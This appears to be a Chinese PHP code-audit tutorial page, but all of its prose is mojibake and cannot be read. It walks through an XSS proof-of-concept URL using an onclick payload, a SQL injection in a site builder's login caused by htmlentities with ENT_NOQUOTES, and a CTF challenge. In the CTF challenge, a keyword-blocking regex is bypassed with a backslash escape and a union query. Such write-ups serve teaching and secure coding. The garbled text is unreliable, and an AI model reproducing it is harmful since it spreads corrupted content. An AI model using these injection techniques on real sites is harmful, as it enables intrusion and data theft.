æ¼æ´è§¦å‘ç‚¹åº”è¯¥åœ¨ä»£ç ä¸­çš„ <strong>ç¬¬13-14è¡Œ</strong> ã€‚è¿™ä¸¤è¡Œä»£ç çš„ä½œç”¨æ˜¯ç›´æ¥è¾“å‡ºä¸€ä¸ªhtmlçš„ <code>&lt;a&gt;</code> æ ‡ç­¾ã€‚ä»£ç ä¸­çš„ <strong>ç¬¬3-5è¡Œ</strong> ï¼Œ<strong>foreachå¾ªç¯</strong> å¯¹ <strong>$_GET</strong> ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†å¤„ç†ï¼Œä½†æ˜¯è¿™é‡Œæœ‰ä¸ªé—®é¢˜ã€‚æˆ‘ä»¬çœ‹ä¸‹ <strong>ç¬¬å››è¡Œ</strong> çš„ä»£ç ï¼Œè¿™è¡Œä»£ç é’ˆå¯¹ <strong>$value</strong> è¿›è¡Œç±»å‹è½¬æ¢ï¼Œå¼ºåˆ¶å˜æˆintç±»å‹ã€‚ä½†æ˜¯è¿™éƒ¨åˆ†ä»£ç åªå¤„ç†äº† <strong>$value</strong> å˜é‡ï¼Œæ²¡é’ˆå¯¹ <strong>$key</strong> å˜é‡è¿›è¡Œå¤„ç†ã€‚ç»è¿‡äº† <strong>ç¬¬3-5è¡Œ</strong> çš„ä»£ç å¤„ç†ä¹‹åï¼Œæ ¹æ® <strong>&amp;</strong> è¿™ä¸ªç¬¦å·è¿›è¡Œåˆ†å‰²ï¼Œç„¶åæ‹¼æ¥åˆ° <strong>ç¬¬13è¡Œ</strong> çš„ <strong>echo</strong> è¯­å¥ä¸­ï¼Œåœ¨è¾“å‡ºçš„æ—¶å€™åˆè¿›è¡Œäº†ä¸€æ¬¡ <strong>htmlentities</strong> å‡½æ•°å¤„ç†ã€‚ <strong>htmlentities</strong> å‡½æ•°ä¸»è¦æ˜¯ä¼šå¯¹ä¸€äº›ç‰¹æ®Šç¬¦å·è¿›è¡ŒHTMLå®ä½“ç¼–ç ã€‚å…·ä½“å®šä¹‰å¦‚ä¸‹ï¼š</p><blockquote><p><a href="http://php.net/manual/zh/function.htmlentities.php">htmlentities</a> â€” å°†å­—ç¬¦è½¬æ¢ä¸º HTML è½¬ä¹‰å­—ç¬¦</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">htmlentities</span> ( <span class="keyword">string</span> <span class="variable">$string</span> [, <span class="keyword">int</span> <span class="variable">$flags</span> = ENT_COMPAT | ENT_HTML401 [, <span class="keyword">string</span> <span class="variable">$encoding</span> = <span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;default_charset&quot;</span>) [, <span class="keyword">bool</span> <span class="variable">$double_encode</span> = <span class="literal">true</span> ]]] )</span><br></pre></td></tr></table></figure><p>ä½œç”¨ï¼šåœ¨å†™PHPä»£ç æ—¶ï¼Œä¸èƒ½åœ¨å­—ç¬¦ä¸²ä¸­ç›´æ¥å†™å®ä½“å­—ç¬¦ï¼ŒPHPæä¾›äº†ä¸€ä¸ªå°†HTMLç‰¹æ®Šå­—ç¬¦è½¬æ¢æˆå®ä½“å­—ç¬¦çš„å‡½æ•° htmlentities()ã€‚</p></blockquote><p>æ³¨ï¼š<strong>htmlentities()</strong> å¹¶ä¸èƒ½è½¬æ¢æ‰€æœ‰çš„ç‰¹æ®Šå­—ç¬¦ï¼Œæ˜¯è½¬æ¢é™¤äº†ç©ºæ ¼ä¹‹å¤–çš„ç‰¹æ®Šå­—ç¬¦ï¼Œä¸”å•å¼•å·å’ŒåŒå¼•å·éœ€è¦å•ç‹¬æ§åˆ¶ï¼ˆé€šè¿‡ç¬¬äºŒä¸ªå‚æ•°ï¼‰ã€‚ç¬¬2ä¸ªå‚æ•°å–å€¼æœ‰3ç§ï¼Œåˆ†åˆ«å¦‚ä¸‹ï¼š</p><ul><li>ENT_COMPATï¼ˆé»˜è®¤å€¼ï¼‰ï¼šåªè½¬æ¢åŒå¼•å·ã€‚</li><li>ENT_QUOTESï¼šä¸¤ç§å¼•å·éƒ½è½¬æ¢ã€‚</li><li>ENT_NOQUOTESï¼šä¸¤ç§å¼•å·éƒ½ä¸è½¬æ¢ã€‚</li></ul><p>è¿™é‡Œé™„ä¸Šä¸€ä¸ª <a href="http://www.w3school.com.cn/html/html_entities.asp">HTML ä¸­æœ‰ç”¨çš„å­—ç¬¦å®ä½“è¡¨</a> </p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image.png"></p><p>ç»è¿‡ä¸Šé¢çš„åˆ†æï¼Œæˆ‘ä»¬å†å›åˆ°é¢˜ç›®ï¼Œæƒ³æƒ³å¦‚ä½•æ„é€ ä¸€ä¸‹æ”»å‡» <strong>payload</strong> ã€‚æˆ‘ä»¬å…ˆæ¢³ç†ä¸€äº›å·²çŸ¥ä¿¡æ¯ï¼š</p><ul><li>è¿™é‡Œçš„ <strong>$query</strong> å‚æ•°å¯æ§</li><li>ä¸” <strong>htmlentities</strong> å‡½æ•°åœ¨è¿™é‡Œå¯é€ƒé€¸å•å¼•å·</li><li>xssçš„æ¼æ´è§¦å‘ç‚¹åœ¨ <code>&lt;a&gt;</code> æ ‡ç­¾ã€‚</li></ul><p>åœ¨ <code>&lt;a&gt;</code> ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <strong>javascript</strong> äº‹ä»¶æ¥æ‰§è¡Œjsä»£ç ï¼Œä¾‹å¦‚ï¼š <strong>onclick</strong> è¿™ç±»äº‹ä»¶ï¼Œå› æ­¤æœ€åçš„pocæ„é€ å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?a&#x27;onclick%3dalert(1)%2f%2f=c</span><br></pre></td></tr></table></figure><h3 id="å®ä¾‹åˆ†æ"><a href="#å®ä¾‹åˆ†æ" class="headerlink" title="å®ä¾‹åˆ†æ"></a>å®ä¾‹åˆ†æ</h3><p>æœ¬æ¬¡å®ä¾‹åˆ†æé€‰æ‹© <a href="http://sqdownb.onlinedown.net/down/1510917608_44072_ym.rar">DMä¼ä¸šå»ºç«™ç³»ç»Ÿ v201710</a> ä¸­çš„ <strong>sqlæ³¨å…¥æ¼æ´</strong> æ¥è¿›è¡Œåˆ†æã€‚é¦–å…ˆï¼Œæˆ‘ä»¬å¯ä»¥ä»cnvdä¸Šé¢çœ‹åˆ°ä¸€äº›ç›¸å…³ä¿¡æ¯ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-1.png"></p><p>ä»æ¼æ´é€šå‘Šä¸­å¯ä»¥å‘ç°ä¸€äº›æœ‰ç”¨çš„ä¿¡æ¯ï¼Œæ¼æ´ä½ç½®åœ¨ç™»é™†å¤„ï¼Œæ­å»ºçš„æ—¶å€™æç¤ºåå°ç™»é™†å£ä½ç½®åœ¨ <strong>admindm-yourname&#x2F;g.php</strong> æ–‡ä»¶ä¸­ï¼Œæ‰“å¼€è¿™ä¸ªæ–‡ä»¶ï¼Œå‘ç°é‡å®šå‘åˆ° <strong>admindm-yournamemod_common&#x2F;login.php</strong> æ–‡ä»¶ä¸­ï¼Œæ‰€ä»¥æ¼æ´è§¦å‘ç‚¹åº”è¯¥å°±åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-2.png"></p><p>æ‰“å¼€ <strong>admindm-yournamemod_common&#x2F;login.php</strong> è¿™ä¸ªæ–‡ä»¶ï¼Œä¸€çœ¼å°±çœ‹åˆ°æ¼æ´ä½ç½®ï¼Œæˆªå–éƒ¨åˆ†ç›¸å…³ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$act</span>==<span class="string">&#x27;login&#x27;</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$user</span>= <span class="title function_ invoke__">htmlentitiesdm</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]));</span><br><span class="line">    <span class="variable">$ps</span>= <span class="title function_ invoke__">htmlentitiesdm</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$user</span>)&lt;<span class="number">2</span> <span class="keyword">or</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$ps</span>)&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">alert</span>(<span class="string">&#x27;å­—ç¬¦ä¸å¤Ÿ sorry,user need more long&#x27;</span>); <span class="title function_ invoke__">jump</span>(<span class="variable">$jumpv</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">require_once</span> WEB_ROOT.<span class="string">&#x27;component/dm-config/mysql.php&#x27;</span>;</span><br><span class="line">    <span class="comment">// $salt = &#x27;00&#x27;; is in config.php</span></span><br><span class="line">    <span class="variable">$pscrypt</span>= <span class="title function_ invoke__">crypt</span>(<span class="variable">$ps</span>, <span class="variable">$salt</span>);</span><br><span class="line">    <span class="comment">//echo $pscrypt;</span></span><br><span class="line">    <span class="variable">$ss_P</span>=<span class="string">&quot;select * from &quot;</span>.TABLE_USER.<span class="string">&quot; where email=&#x27;<span class="subst">$user</span>&#x27; and ps=&#x27;<span class="subst">$pscrypt</span>&#x27; order by id desc limit 1&quot;</span>;</span><br><span class="line">    <span class="comment">// echo $ss_P;exit;</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">getnum</span>(<span class="variable">$ss_P</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$row</span>=<span class="title function_ invoke__">getrow</span>(<span class="variable">$ss_P</span>);</span><br><span class="line">            <span class="variable">$userid</span>=<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <strong>ç¬¬15è¡Œ</strong> å¾ˆæ˜æ˜¾å­˜åœ¨sqlæ³¨å…¥æ¼æ´ï¼Œé€šè¿‡æ‹¼æ¥çš„æ–¹å¼ç›´æ¥æ’å…¥åˆ°selectè¯­å¥ä¸­ã€‚ <strong>ç¬¬15è¡Œ</strong> ä¸­çš„ <strong>$user</strong> å˜é‡æ˜¯é€šè¿‡ <strong>POST</strong> æ–¹å¼æäº¤ä¸Šæ¥ï¼Œå…¶å€¼å¯æ§ã€‚ä½†æ˜¯ä¸Šå›¾çš„ <strong>ç¬¬3è¡Œ</strong> ä»£ç è°ƒç”¨ <strong>htmlentitiesdm</strong> å‡½æ•°ï¼Œå¯¹ <strong>POST</strong> æ•°æ®è¿›è¡Œäº†å¤„ç†ï¼Œæˆ‘ä»¬è·Ÿè¿›è¿™ä¸ª <strong>htmlentitiesdm</strong> å‡½æ•°ã€‚è¯¥å‡½æ•°ä½ç½®åœ¨ <strong>component&#x2F;dm-config&#x2F;global.common.php</strong> æ–‡ä»¶ä¸­ï¼Œæˆªå–å…³é”®ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">htmlentitiesdm</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">htmlentities</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$v</span>),ENT_NOQUOTES,<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°æ˜¯è°ƒç”¨ <strong>htmlentities</strong> å‡½æ•°é’ˆå¯¹è¾“å…¥çš„æ•°æ®è¿›è¡Œå¤„ç†ã€‚å‰é¢æˆ‘ä»¬å·²ç»ä»‹ç»è¿‡äº†è¿™ä¸ªå‡½æ•°çš„ç”¨æ³•ï¼Œè¿™é‡Œè¿™ä¸ªå‡½æ•°çš„å¯é€‰å‚æ•°æ˜¯ <strong>ENT_NOQUOTES</strong> ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸¤ç§å¼•å·éƒ½ä¸è½¬æ¢ã€‚ä¸‹é¢æˆ‘ä»¬æ¥çœ‹ä¸ªå°ä¾‹å­ï¼š</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-5.png"></p><p>è¿™é‡Œæˆ‘çŒœæµ‹å¼€å‘è€…åº”è¯¥æ˜¯è€ƒè™‘åˆ°äº†xssçš„é—®é¢˜ï¼Œä½†æ˜¯ç”±äº <strong>htmlentities</strong> è¿™ä¸ªå‡½æ•°é€‰æ‹©çš„å‚æ•°å‡ºç°äº†åå·®ï¼Œå¯¼è‡´è¿™é‡Œæˆ‘ä»¬å¯ä»¥å¼•å…¥å•å¼•å·é€ æˆæ³¨å…¥çš„é—®é¢˜ã€‚</p><p>æˆ‘ä»¬çœ‹çœ‹æœ€æ–°ç‰ˆæ˜¯æ€ä¹ˆä¿®å¤ï¼Œä½¿ç”¨ <strong>beyond compare</strong> å¯¹æ¯”ä¸¤ä¸ªç‰ˆæœ¬ä»£ç çš„å·®åˆ«ã€‚</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-3.png"></p><p>æ–°ç‰ˆä¿®å¤çš„æ—¶å€™å°†å¯é€‰å‚æ•°ä¿®æ”¹ä¸º <strong>ENT_QUOTES</strong> ï¼Œè¿™ä¸ªå‚æ•°çš„ä½œç”¨å°±æ˜¯è¿‡æ»¤å•å¼•å·åŠ åŒå¼•å·ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹ä¸‹é¢è¿™ä¸ªä¾‹å­ï¼Œå°±å¾ˆå®¹æ˜“æ˜ç™½äº†è¿™ä¸ªå‚æ•°çš„ä½œç”¨äº†ã€‚<br><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-4.png"></p><h3 id="æ¼æ´éªŒè¯"><a href="#æ¼æ´éªŒè¯" class="headerlink" title="æ¼æ´éªŒè¯"></a>æ¼æ´éªŒè¯</h3><p>è¿™é‡Œå› ä¸ºæ²¡æœ‰å›æ˜¾ï¼Œæ‰€ä»¥æ˜¯ç›²æ³¨ï¼Œä¸‹é¢æ˜¯éªŒè¯æˆªå›¾ï¼š</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-6.png"></p><h3 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h3><p>é’ˆå¯¹ <strong>htmlentities</strong> è¿™ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬å»ºè®®å¤§å®¶åœ¨ä½¿ç”¨çš„æ—¶å€™ï¼Œå°½é‡åŠ ä¸Šå¯é€‰å‚æ•°ï¼Œå¹¶ä¸”é€‰æ‹© <strong>ENT_QUOTES</strong> å‚æ•°ã€‚</p><h3 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;db.inc.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/(?:\w*)\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i&quot;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Attack detected!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/(?:\w*)\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i&quot;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Attack detected!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">get_magic_quotes_gpc</span>())&#123;</span><br><span class="line">        <span class="variable">$str</span>=<span class="title function_ invoke__">stripslashes</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$str</span>, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = @<span class="title function_ invoke__">clean</span>((<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"><span class="variable">$password</span> = @<span class="title function_ invoke__">clean</span>((<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span>=<span class="string">&#x27;SELECT * FROM ctf.users WHERE name=\&#x27;&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;\&#x27; AND pass=\&#x27;&#x27;</span>.<span class="variable">$password</span>.<span class="string">&#x27;\&#x27;;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#echo $query;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;&quot;</span> . <span class="variable">$row</span>[<span class="string">&#x27;name&#x27;</span>] . <span class="string">&quot;&lt;/td&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/tr&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$mysql_server_name</span>=<span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$mysql_database</span>=<span class="string">&quot;Day12&quot;</span>;    <span class="comment">/** æ•°æ®åº“çš„åç§° */</span></span><br><span class="line"><span class="variable">$mysql_username</span>=<span class="string">&quot;Hongri&quot;</span>;  <span class="comment">/** MySQLæ•°æ®åº“ç”¨æˆ·å */</span></span><br><span class="line"><span class="variable">$mysql_password</span>=<span class="string">&quot;Hongri&quot;</span>;  <span class="comment">/** MySQLæ•°æ®åº“å¯†ç  */</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysql_connect</span>(<span class="variable">$mysql_server_name</span>, <span class="variable">$mysql_username</span>,<span class="variable">$mysql_password</span>,<span class="string">&#x27;utf-8&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä»ä»£ç  <strong>ç¬¬27è¡Œ</strong> å¾ˆæ˜æ˜¾ï¼Œè¿™é“é¢˜è€ƒæŸ¥sqlæ³¨å…¥ï¼Œä½†æ˜¯è¿™é‡Œæœ‰ä¸¤ä¸ªè€ƒå¯Ÿç‚¹ï¼Œæˆ‘ä»¬åˆ†åˆ«æ¥çœ‹ä¸€ä¸‹ã€‚</p><h3 id="ç¬¬ä¸€éƒ¨åˆ†"><a href="#ç¬¬ä¸€éƒ¨åˆ†" class="headerlink" title="ç¬¬ä¸€éƒ¨åˆ†"></a>ç¬¬ä¸€éƒ¨åˆ†</h3><p> <strong>ç¬¬23è¡Œ</strong> å’Œ <strong>ç¬¬24è¡Œ</strong> é’ˆå¯¹ <strong>GET</strong> æ–¹å¼è·å–åˆ°çš„ <strong>username</strong> å’Œ <strong>password</strong> è¿›è¡Œäº†å¤„ç†ï¼Œå¤„ç†å‡½æ•°ä¸º <strong>clean</strong> ã€‚è¯¥å‡½æ•°åœ¨ <strong>ç¬¬16-20è¡Œ</strong> å¤„å®šä¹‰ï¼Œå‡½æ•°çš„ä¸»è¦åŠŸèƒ½å°±æ˜¯ä½¿ç”¨ <strong>htmlentities</strong> å‡½æ•°å¤„ç†å˜é‡ä¸­å¸¦æœ‰çš„ç‰¹æ®Šå­—ç¬¦ï¼Œè€Œè¿™é‡ŒåŠ å…¥äº† <strong>htmlentities</strong> å‡½æ•°çš„å¯é€‰å‚æ•° <strong>ENT_QUOTES</strong> ï¼Œå› æ­¤è¿™é‡Œä¼šå¯¹ <strong>å•å¼•å·</strong> ï¼Œ <strong>åŒå¼•å·</strong> ç­‰ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ä¹‰å¤„ç†ã€‚ç”±äºè¿™é‡Œçš„æ³¨å…¥æ˜¯å­—ç¬¦å‹çš„ï¼Œéœ€è¦é—­åˆå•å¼•å·æˆ–è€…é€ƒé€¸å•å¼•å·ï¼Œå› æ­¤è¿™é‡Œéœ€è¦ç»•è¿‡è¿™ä¸ªå‡½æ•°ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹é¢è¿™ä¸ªä¾‹å­è§‚å¯Ÿ <strong>clean</strong> å‡½æ•°çš„å¤„ç†æ•ˆæœï¼š</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-7.png"></p><p>é¢˜ç›® <strong>ç¬¬36è¡Œ</strong> æ˜¯è¿›å…¥æ•°æ®åº“æŸ¥è¯¢ï¼Œå¹¶ä¸”è¿”å› <strong>name</strong> åˆ—å­—æ®µçš„å€¼ã€‚è€Œè¿™é‡Œçš„sqlè¯­å¥æ˜¯è¿™æ ·çš„ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span>=<span class="string">&#x27;SELECT * FROM ctf.users WHERE name=\&#x27;&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;\&#x27; </span></span><br><span class="line"><span class="string">AND pass=\&#x27;&#x27;</span>.<span class="variable">$password</span>.<span class="string">&#x27;\&#x27;;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>é‚£æˆ‘ä»¬å¦‚æœè¾“å…¥çš„ <strong>username</strong> æ˜¯ <strong>admin</strong> ï¼Œ <strong>password</strong> æ˜¯ <strong>admin</strong> ï¼Œè‡ªç„¶å°±æ„æˆäº†æ­£å¸¸è¦æ‰§è¡Œçš„sqlè¯­å¥ã€‚</p><p>è¿™é“é¢˜çš„é—®é¢˜å°±åœ¨äºå¯ä»¥å¼•å…¥åæ–œæ ï¼Œä¹Ÿå°±æ˜¯è½¬ä¹‰ç¬¦ï¼Œå®˜æ–¹é’ˆå¯¹ <a href="http://php.net/manual/zh/regexp.reference.escape.php">è½¬ä¹‰ç¬¦</a> æ˜¯è¿™ä¹ˆè§£é‡Šçš„ã€‚</p><blockquote><p>æ¯”å¦‚ï¼Œå¦‚æœä½ å¸Œæœ›åŒ¹é…ä¸€ä¸ª â€œ*â€ å­—ç¬¦ï¼Œå°±éœ€è¦åœ¨æ¨¡å¼ä¸­å†™ä¸º <code>\*</code>ã€‚ è¿™é€‚ç”¨äºä¸€ä¸ªå­—ç¬¦åœ¨ä¸è¿›è¡Œè½¬ä¹‰ä¼šæœ‰ç‰¹æ®Šå«ä¹‰çš„æƒ…å†µä¸‹ã€‚</p></blockquote><p>è¿™é‡Œæˆ‘ä»¬çœ‹ä¸ªç®€å•çš„ä¾‹å­ç†è§£ä¸€ä¸‹è¿™ä¸ªè½¬ä¹‰ç¬¦å·ã€‚</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-8.png"></p><p>è½¬ä¹‰ç¬¦å·ä¼šè®©å½“å‰çš„ç‰¹æ®Šç¬¦å·å¤±å»å®ƒçš„ä½œç”¨ï¼Œè¿™é“é¢˜ç”±äºå¯ä»¥å¼•å…¥åæ–œæ ï¼Œä¹Ÿå°±æ˜¯è½¬ä¹‰ç¬¦å·ï¼Œæ¥è®©</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span>=<span class="string">&#x27;SELECT * FROM ctf.users WHERE name=\&#x27;&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;\&#x27; </span></span><br><span class="line"><span class="string">AND pass=\&#x27;&#x27;</span>.<span class="variable">$password</span>.<span class="string">&#x27;\&#x27;;&#x27;</span>;</span><br></pre></td></tr></table></figure><p><strong>username</strong>åé¢çš„ <strong>â€˜</strong> å¤±æ•ˆï¼Œåªè¦è¿™ä¸ª <strong>â€˜</strong> å¤±æ•ˆï¼Œå°±èƒ½é—­åˆ**pass&#x3D;**åé¢çš„ **â€™**ã€‚æœ€åç»„åˆçš„payloadå°±å¦‚ä¸‹å›¾æ‰€ç¤º</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-9.png"></p><p>æ‰€ä»¥å®é™…ä¸Šç›®å‰ <strong>name</strong> çš„å€¼æ˜¯ <strong>admin\â€˜ AND pass&#x3D;</strong> ,è¿™æ—¶å€™ <strong>password</strong> çš„å€¼æ˜¯ä¸€ä¸ªå¯æ§çš„è¾“å…¥ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªå€¼æ¥æ„é€  <strong>sql</strong> çš„ <strong>è”åˆæŸ¥è¯¢</strong> ï¼Œå¹¶ä¸”æ³¨é‡Šæ‰æœ€åçš„ <strong>å•å¼•å·</strong> ã€‚</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-10.png"></p><p>ç¬¬ä¸€éƒ¨åˆ†æˆ‘ä»¬å…¶å®å·²ç»æˆåŠŸæ„é€ å¥½äº†payloadï¼Œä½†æ˜¯å›å¤´æ¥çœ‹çœ‹é¢˜ç›®ï¼Œé¢˜ç›® <strong>ç¬¬6è¡Œ</strong> åˆ° <strong>ç¬¬16è¡Œ</strong> æœ‰ä¸¤ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œä½œç”¨å°±æ˜¯å¦‚æœå‚æ•°ä¸­å¸¦æœ‰ <strong>orã€and ã€union</strong> ç­‰æ•°æ®ï¼Œå°±é€€å‡ºï¼Œå¹¶è¾“å‡º <strong>Attack detected!!!</strong> </p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-11.png"></p><p>è¿™é‡Œå½“ç„¶æˆ‘ä»¬å¯ä»¥æ­£é¢ç¡¬åˆšè¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼ã€‚ä½†æ˜¯è¿™é‡Œæˆ‘ä»¬æ¥èŠä¸€ä¸ªæ¯”è¾ƒæœ‰è¶£çš„è§£æ³•ã€‚</p><p>æˆ‘ä»¬çœ‹åˆ°æ˜¯é€šè¿‡ <strong>request</strong> æ–¹å¼ä¼ å…¥æ•°æ®ï¼Œè€Œphpä¸­ 